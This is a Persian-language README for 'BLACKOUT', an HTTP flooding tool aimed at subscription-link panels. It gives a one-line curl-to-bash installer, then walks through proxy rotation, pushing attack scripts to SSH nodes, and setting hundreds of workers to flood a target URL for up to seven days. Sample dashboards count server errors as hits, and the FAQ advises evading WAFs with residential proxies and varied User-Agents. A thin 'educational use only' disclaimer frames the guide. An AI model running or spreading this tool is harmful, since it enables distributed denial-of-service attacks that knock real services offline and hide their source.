# BLACKOUT

فریمورک نفوذ و تست فشار لایه‌ی هفتم

ابزار L7 با چرخش پروکسی و پشتیبانی از کلاستر توزیع‌شده

---

## سلب مسئولیت

این پروژه فقط برای آموزش و تست‌های امنیتی مجاز ساخته شده است. استفاده از این ابزار علیه سرورها یا سرویس‌هایی که مالک آن‌ها نیستید یا اجازه‌ی کتبی برای تست آن‌ها ندارید، در اکثر کشورها جرم کیفری محسوب می‌شود. نویسنده هیچ مسئولیتی در قبال سوءاستفاده یا آسیب‌های ناشی از استفاده‌ی نادرست ندارد. قبل از هر استفاده، مطمئن شوید مجوز قانونی دارید.

---

## نمای کلی

BLACKOUT یک فریمورک حمله‌ی لایه‌ی هفتم است که حول چهار بخش اصلی ساخته شده:

- موتور Saturation که درخواست‌های HTTP/1.1 را روی اتصال‌های Keep-Alive پایدار ارسال می‌کند
- سیستم چرخش پروکسی با پشتیبانی از SOCKS5، SOCKS4، HTTP و HTTPS
- حالت کلاستر توزیع‌شده که همان حمله را روی نودهای ریموت از طریق SSH اجرا می‌کند
- حالت Safe Mode که هنگام مشاهده‌ی خطاهای origin حمله را متوقف و بعد از ریکاوری ادامه می‌دهد

همه‌ی این‌ها در قالب یک داشبورد زنده‌ی ترمینال بسته‌بندی شده که throughput، آمار هر نود، سلامت پروکسی و فید رویدادها را نشان می‌دهد.

---

## ویژگی‌ها

- Throughput بالا، تا صدها هزار درخواست بر ثانیه با تنظیم درست ulimit
- سه حالت چرخش پروکسی: random، round_robin و weighted بر اساس latency
- اعتبارسنجی موازی پروکسی با نوار پیشرفت زنده
- کلاستر SSH با دیپلوی خودکار نود و مانیتورینگ سلامت
- Safe Mode با توقف و ادامه‌ی خودکار روی خطاهای origin
- داشبورد Live با رندر تطبیقی و throttle هوشمند
- اجرا در tmux به‌طوری که بستن SSH حمله را متوقف نمی‌کند
- گزارش JSON برای هر اجرا
- نصب‌کننده‌ای که پکیج‌های سیستم، dependencies پایتون، ulimit و tune کرنل را مدیریت می‌کند

---

## معماری

دو لایه وجود دارد.

لایه‌ی Master به‌صورت محلی اجرا می‌شود. worker pool، proxy pool، داشبورد و (به‌صورت اختیاری) مجموعه‌ای از نودهای ریموت را مدیریت می‌کند.

لایه‌ی نود اختیاری است. هر نود یک اسکریپت پایتون مستقل را از طریق SSH دریافت می‌کند، آن را در بک‌گراند اجرا می‌کند و آمار زنده‌ی خود را در فایلی می‌نویسد که Master هر چند ثانیه یک بار آن را poll می‌کند.

ماژول‌های اصلی:

- stress_worker یک درخواست HTTP می‌فرستد و آمار را به‌روزرسانی می‌کند
- adaptive_attack حلقه‌ی اصلی را اجرا می‌کند، taskها را مدیریت می‌کند و تعداد workerها را تنظیم می‌کند
- ProxyManager پروکسی‌ها را بارگذاری، اعتبارسنجی، چرخش و ردیابی می‌کند
- NodeManager اتصال SSH، دیپلوی اسکریپت و پولینگ وضعیت را انجام می‌دهد
- LiveDashboard رابط ترمینال را با بخش‌های اندازه‌ی ثابت رندر می‌کند
- RateLimiter نرخ درخواست هر worker را محدود می‌کند
- SafeModeState وضعیت توقف و ادامه‌ی Safe Mode را نگه می‌دارد

---

## پیش‌نیازها

- سیستم‌عامل Linux یا macOS
- پایتون نسخه‌ی ۳.۸ یا بالاتر
- شل bash
- curl، git و tmux
- پکیج‌های پایتون: aiohttp، aiohttp-socks، paramiko، brotli و dnspython

ویندوز پشتیبانی نمی‌شود. در صورت نیاز از WSL2 استفاده کنید.

---

## نصب سریع

یک خطی:

```bash
bash <(curl -fsSL https://raw.githubusercontent.com/coderuseplayer-netizen/subscriptionlink-panel-DoS-ATTACK/main/install.sh)
```

نصب‌کننده این کارها را انجام می‌دهد:

1. نصب پکیج‌های سیستم شامل python3، pip، tmux، curl، wget و build tools
2. نصب تمام dependencies پایتون
3. بالابردن ulimit به ۶۵۵۳۵ به‌صورت soft و hard و دائمی
4. tune کردن پارامترهای کرنل TCP در صورت اجرا با root
5. ساخت پوشه‌ی کاری در مسیر `~/blackout/`
6. دانلود اسکریپت اصلی به‌عنوان `run.py`
7. نصب دستور `blackout` در مسیر `/usr/local/bin`
8. راه‌اندازی یک session در tmux در بک‌گراند

---

## نصب دستی

اگر نمی‌خواهید از نصب‌کننده استفاده کنید:

```bash
git clone https://github.com/coderuseplayer-netizen/subscriptionlink-panel-DoS-ATTACK.git
cd subscriptionlink-panel-DoS-ATTACK
pip3 install aiohttp aiohttp-socks paramiko brotli dnspython cryptography
ulimit -n 65535
python3 main.py
```

---

## شروع به کار

### ورود به کنسول

بعد از نصب دستور زیر را بزنید:

```bash
blackout
```

منوی اصلی نمایش داده می‌شود:

```
  ● SELECT ATTACK MODULE

    [1]  Saturation Bombardment          → L7 high-concurrency
    [2]  Proxy Management                → rotation control
    [3]  Node Management                 → distributed cluster
    [0]  Exit

  ● Proxy pool  empty — direct mode only
  ● Node cluster  empty — single-server mode

  ➜ Choose module [1]:
```

### بارگذاری پروکسی

گزینه‌ی `[2]` را برای مدیریت پروکسی انتخاب کنید، سپس `[1]` برای بارگذاری از فایل. نام پیش‌فرض فایل `proxies.txt` است.

فرمت‌های پشتیبانی‌شده، هر خط یک پروکسی:

```
socks5://username:password@1.2.3.4:1080
socks5://1.2.3.4:1080
http://1.2.3.4:8080
1.2.3.4:1080
1.2.3.4:8080
user:pass@1.2.3.4:1080
```

خطوطی که با `#` شروع می‌شوند نادیده گرفته می‌شوند. اگر scheme را ننویسید، بر اساس پورت حدس زده می‌شود. پورت‌های ۱۰۸۰ تا ۱۰۸۵ و ۹۰۵۰ به‌عنوان SOCKS و پورت‌های ۸۰، ۴۴۳، ۸۰۸۰، ۳۱۲۸ و مشابه به‌عنوان HTTP در نظر گرفته می‌شوند.

### اعتبارسنجی پروکسی‌ها

از بخش مدیریت پروکسی گزینه‌ی `[3]` را بزنید:

```
  ➜ Validating 245 proxies...

  Alive:   187  Dead:    58  Progress:   245/245  [==============================]  100%

  ● RESULT
  ├─ Total      245
  ├─ Alive      187
  └─ Dead       58

  ➜ Creating sessions for working proxies...
  ✓ 187 sessions ready. Proxy rotation ENABLED.
```

به‌طور پیش‌فرض پروکسی‌ها با `api.ipify.org` تست می‌شوند. اگر این هاست در دسترس نیست، از گزینه‌ی `[6]` برای تغییر URL استفاده کنید.

### افزودن نود

از منوی اصلی `[3]` را انتخاب کنید، سپس `[1]`:

```
  ➜ Node IP address: 203.0.113.45
  ➜ SSH port [22]: 22
  ➜ Username [root]: root
  ➜ Password: ●●●●●●●●

  ✓ Node added: 203.0.113.45:22
  ➜ Testing connection...
  ✓ SSH connected
  ➜ Checking python3...
  ✓ python3 available
  ➜ Uploading node script...
  ✓ Deployed successfully — node ready
```

اطلاعات نود در `nodes.json` ذخیره و در هر راه‌اندازی مجدد، خودکار دیپلوی می‌شود.

### اجرای حمله

از منوی اصلی `[1]` را انتخاب کنید و پیکربندی را کامل کنید:

```
  ● TARGET CONFIGURATION

  ➜ Target Subscription URL: https://example.com/api/sub
  ➜ Initial Workers [800]: 800
  ➜ Per-Worker RPS (0=unlimited) [800]: 800
  ➜ Attack Duration (seconds) [600]: 600
  ➜ Enable Safe Mode? (pause on origin errors, auto-resume) [y/N]: y
  ➜ Use proxy rotation? (187 available) [Y/n]: y
```

مقادیر مهم:

- Target URL باید با http یا https شروع شود
- Initial Workers تعداد workerهای محلی است، پیش‌فرض ۸۰۰
- Per-Worker RPS نرخ هر worker است، مقدار ۰ به معنای بدون محدودیت
- Duration به ثانیه است، حداکثر تا هفت روز
- Safe Mode هنگام خطاهای ۵xx حمله را pause و بعد از بازگشت هدف resume می‌کند
- Proxy rotation از pool پروکسی‌های validated استفاده می‌کند

نرخ تئوریک کل برابر است با تعداد worker ضرب در نرخ هر worker. در عمل شبکه خیلی قبل‌تر از رسیدن به این عدد، گلوگاه می‌شود.

### تماشای داشبورد

بعد از شروع حمله، داشبورد در ترمینال رندر می‌شود:

```
  ● BLACKOUT · LIVE ATTACK DASHBOARD

  ● ATTACK STATUS
  ├─ Engine        Saturation Bombardment
  ├─ Target        https://example.com/api/sub
  ├─ Safe Mode     ON
  ├─ Workers       850  (min 50 · max 1000)
  ├─ Elapsed       02:47  (remaining 07:13)
  ├─ Total Shots   128,453,201  ·  769,182.4 req/s  · 800 rps/worker
  └─ Master        OK 45,102,113  5xx 82,001,432  TO 1,349,656  403 0  429 0

  ● LIVE EVENTS
  ├─ 200 OK                          45,102,113
  ├─ Connection Fail                       3,449
  ├─ Server Error 503                  82,001,432
  └─ Timeout                            1,349,656

  ● NODE CLUSTER  (3 nodes · 3 active)
  ├─ 203.0.113.45:22   REQ 12,443,201  OK 8,120,331  TO  442,113  5xx 3,880,757
  ├─ 203.0.113.46:22   REQ 11,982,443  OK 7,901,222  TO  401,338  5xx 3,679,883
  └─ 203.0.113.47:22   REQ 12,001,882  OK 7,998,441  TO  399,221  5xx 3,604,220

  ● PROXY POOL  (mode: weighted · 187 alive / 187 total)
  ├─ 1.2.3.4:1080     ALIVE  REQ  92,443  OK  89,120  FAIL  3,323  123ms
  ├─ 5.6.7.8:1080     ALIVE  REQ  88,201  OK  85,022  FAIL  3,179  145ms
  ├─ 9.10.11.12:8080  ALIVE  REQ  85,992  OK  83,011  FAIL  2,981  167ms
  └─ ... and 184 more proxies

  ● RECENT ACTIVITY
  02:47:13  ● SRV-ERR 503  Server bleeding!  Latency: 1204ms
  02:47:12  ● 200 OK        Target hit!  Latency:   89ms
  02:47:11  ● DEADLOCK/TO   Server drowning, timeout!

  [Ctrl+C to abort]  ·  rendered 02:47:13
```

نکات داشبورد:

- اسکرول‌بک ترمینال آزاد است، با Shift+PgUp و Shift+PgDn می‌توانید بالا و پایین بروید
- بخش Live Events هیچ‌وقت truncate نمی‌شود
- بخش‌های Proxy Pool و Recent Activity سقف ثابت چهار و پنج خطی دارند
- در ترمینال‌های کوچک اول بخش‌های کم‌اولویت کوتاه می‌شوند و Events حفظ می‌شود

### توقف حمله

سه راه وجود دارد:

- Ctrl+C در داشبورد برای توقف نرم همراه با ذخیره‌ی گزارش
- `blackout stop` از یک ترمینال دیگر
- `blackout kill` برای توقف اجباری بدون ذخیره‌ی گزارش

### گزارش نهایی

بعد از پایان حمله، خلاصه چاپ می‌شود و گزارش JSON ذخیره می‌گردد:

```
  ● ANNIHILATION REPORT

  ├─ Battle Time       600.32s
  ├─ Shots Fired       461,213,882
  ├─ Fire Rate         768,440.21 req/s
  ├─ Direct Hits       12,443,201
  ├─ Server Errors     447,421,113
  ├─ Timeouts          1,349,568
  └─ Final Workers     850

  ✓ Battle log saved  →  attack_standard_stress_20250315_143022.json
```

شکل گزارش:

```json
{
    "requests": 461213882,
    "success": 12443201,
    "server_error": 447421113,
    "timeouts": 1349568,
    "duration": 600.32,
    "rps": 768440.21,
    "final_workers": 850
}
```

---

## مرجع دستورات

دستور `blackout` این زیردستورها را دارد:

- `blackout` برای اتصال به session، یا ساخت آن در صورت نبود
- `blackout attach` مشابه بالا
- `blackout status` نمایش session، نودها و پروکسی‌ها
- `blackout logs` نمایش ۶۰ خط آخر خروجی session
- `blackout stop` توقف نرم، ارسال SIGINT
- `blackout restart` کشتن session و راه‌اندازی مجدد
- `blackout kill` کشتن اجباری session و پروسه‌ی پایتون

علیاس‌ها:

```
blackout-stop
blackout-status
blackout-restart
blackout-kill
blackout-logs
```

نمونه‌ی خروجی `blackout status`:

```
  ● BLACKOUT STATUS
  ├─ Session      blackout
  ├─ State        ● ACTIVE
  ├─ PID          14422
  ├─ Folder       /home/user/blackout
  ├─ Nodes        3 configured
  ├─ Proxies      245 loaded
  └─ Working      187 alive
```

---

## ساختار فایل‌ها

پوشه‌ی کاری محلی:

```
~/blackout/
├── run.py                           اسکریپت اصلی پایتون
├── run.py.bak                       بکاپ خودکار بعد از آپدیت
├── nodes.json                       اطلاعات نودهای SSH
├── proxies.txt                      لیست خام پروکسی‌ها
├── working_proxies.txt              پروکسی‌های validated
├── attack_standard_stress_*.json    گزارش‌های حمله معمولی
└── attack_distributed_*.json        گزارش‌های حمله توزیع‌شده

/usr/local/bin/blackout              دستور اجرایی
```

روی هر نود SSH:

```
/tmp/node_attack.py               اسکریپت worker نود
/tmp/node_attack_status.json      فایل وضعیت زنده
/tmp/node_attack.log              لاگ نود
/tmp/node_attack.pid              شناسه‌ی پروسه
```

---

## پیکربندی

مقادیر قابل تنظیم در `run.py`:

- `DEFAULT_RPS` نرخ پیش‌فرض هر worker، مقدار ۸۰۰
- `DEFAULT_WORKERS` تعداد پیش‌فرض workerها، مقدار ۸۰۰
- `ORIGIN_ERROR_CODES` مجموعه‌ی کدهای ۵xx که Safe Mode را trigger می‌کنند
- `ADJUST_INTERVAL` بازه‌ی تنظیم تطبیقی به ثانیه، مقدار ۲۰
- `max_concurrency` سقف workerها، مقدار ۱۰۰۰
- `min_concurrency` کف workerها، مقدار ۵۰
- `dead_threshold` تعداد fail پشت‌سرهم برای dead شدن پروکسی، مقدار ۵۰۰
- `conn_limit_per_proxy` حداکثر اتصال هم‌زمان به هر پروکسی، مقدار ۳۰

تنظیمات Proxy Manager از `[2]` سپس `[6]`، `[7]` و `[8]`:

- Validation URL
- Validation timeout پیش‌فرض ۱۰ ثانیه، سقف ۱۵ ثانیه
- Validation concurrency پیش‌فرض ۱۰۰

حالت‌های چرخش از `[2]` سپس `[5]`:

- `random` انتخاب تصادفی پروکسی برای هر درخواست
- `round_robin` چرخش ترتیبی روی پروکسی‌های زنده
- `weighted` ترجیح پروکسی‌های با latency کمتر

---

## رفع مشکلات

### خطای ModuleNotFoundError برای aiohttp_socks

```bash
pip3 install aiohttp-socks --break-system-packages
```

### خطای Too many open files

```bash
ulimit -n 65535
```

اگر جواب نداد این خطوط را به `/etc/security/limits.conf` اضافه کنید:

```
* soft nofile 65535
* hard nofile 65535
```

سپس logout و login کنید یا `blackout restart` بزنید.

### خطای paramiko not installed

```bash
pip3 install paramiko --break-system-packages
```

### نود SSH وصل نمی‌شود

- بررسی کنید که python3 روی نود موجود است
- پسورد را دوباره چک کنید
- با `blackout logs` خطای دقیق را ببینید
- firewall نود را چک کنید، پورت ۲۲ باید باز باشد

### همه‌ی پروکسی‌ها dead هستند

- URL اعتبارسنجی را عوض کنید
- timeout را بالا ببرید
- concurrency را پایین بیاورید
- بعضی پروکسی‌ها فقط با HTTP کار می‌کنند نه HTTPS

### داشبورد رندر نمی‌شود

- داشبورد فقط روی TTY کار می‌کند، زیر pipe یا redirect غیرفعال می‌شود
- روی ترمینال‌های خیلی کوچک بخش‌های کم‌اولویت حذف می‌شوند
- با `blackout logs` خروجی خام را ببینید

### پروسه بعد از Ctrl+C هنوز زنده است

```bash
blackout kill
```

---

## سوالات متداول

### چرا تعداد requestها زیاد است ولی success صفر؟

احتمالاً هدف پشت WAF است. Safe Mode را خاموش کنید، از پروکسی‌های residential استفاده کنید و User-Agent ها را variation بدهید.

### تفاوت per worker RPS و total RPS چیست؟

per worker RPS نرخ یک worker است. Total RPS برابر است با تعداد worker ضرب در نرخ هر worker. اگر per worker RPS صفر باشد، هر worker تا جایی که شبکه اجازه بدهد درخواست می‌فرستد.

### آیا روی ویندوز اجرا می‌شود؟

خیر، Linux و macOS پشتیبانی می‌شوند. روی ویندوز از WSL2 استفاده کنید.

### چطور بفهمم Safe Mode فعال است؟

خط `Safe Mode` در داشبورد مقدار `ON` نشان می‌دهد. همچنین eventهای `Safe-Mode Triggered` و `Safe-Mode Recovered` در بخش رویدادها ظاهر می‌شوند.

### چطور بفهمم پروکسی واقعاً کار می‌کند؟

از `[2]` سپس `[4]` استفاده کنید تا آمار هر پروکسی را ببینید. عدد بزرگ در ستون `OK` نشانه‌ی سلامت است.

### چرا نودها STALLED نشان داده می‌شوند؟

نود در ۳۰ ثانیه‌ی گذشته هیچ درخواستی تولید نکرده. با `blackout logs` لاگ نود را ببینید یا اتصال SSH را دوباره تست کنید.

### می‌توانم پوشه‌ی `~/blackout` را تغییر دهم؟

بله، مقدار `BLACKOUT_DIR` را در `install.sh` تغییر دهید و دوباره نصب کنید.

### چطور نسخه‌ی جدید نصب کنم؟

`blackout stop` بزنید و نصب‌کننده را دوباره اجرا کنید. اسکریپت قبلی به‌طور خودکار بکاپ می‌شود.

---

## امنیت

- پسورد نودها به‌صورت plain text در `nodes.json` ذخیره می‌شود. فایل را با `chmod 600` محافظت کنید
- هیچ چیزی به هیچ سرور ریموتی ارسال نمی‌شود، همه‌چیز محلی اجرا می‌شود
- پروکسی‌ها فقط به‌عنوان مسیر ترافیک استفاده می‌شوند و لاگ اضافه‌ای نگه‌داری نمی‌شود
- گزارش‌ها حاوی URL هدف هستند، در اشتراک‌گذاری عمومی احتیاط کنید

---

## مجوز

فقط برای استفاده‌ی آموزشی. هرگونه استفاده برای اهداف مخرب، تجاری یا غیرقانونی به‌طور صریح ممنوع است.

---

ساخته شده برای محققان امنیت و تیم‌های Red Team
```
